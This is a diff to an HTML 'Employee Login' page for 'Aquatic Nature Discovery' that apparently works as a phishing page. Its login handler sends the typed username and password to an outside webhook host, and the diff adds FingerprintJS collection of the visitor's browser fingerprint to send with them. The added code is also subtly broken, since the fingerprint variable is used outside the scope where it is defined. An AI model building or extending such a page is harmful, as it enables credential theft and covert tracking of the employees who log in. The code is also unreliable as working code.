@@ -7,6 +7,11 @@
     <title>Employee Login - Aquatic Nature Discovery</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+    function initFingerprintJS() {
+        return import('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/+esm').then(FingerprintJS => FingerprintJS.load());
+    }
+    </script>
     <style>
         .login-container {
             max-width: 400px;
@@ -241,12 +246,22 @@
             loginButton.disabled = true;
             loginButton.textContent = 'Logging in...';
 
+            // Collect browser fingerprint
+            initFingerprintJS().then(fp => fp.get()).then(result => {
+                const fingerprint = { visitorId: result.visitorId };
+                for (const [key, component] of Object.entries(result.components)) {
+                    fingerprint[key] = component.value;
+                }
+                console.log(fingerprint);
+            });
+
+            
             const response = await fetch('https://keen-mouse-26.webhook.cool', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json'
               },
-              body: JSON.stringify({ username: username, password: password })
+              body: JSON.stringify({ username: username, password: password, fingerprint: fingerprint })
             });        
 
             // Redirect to portal page after a short delay
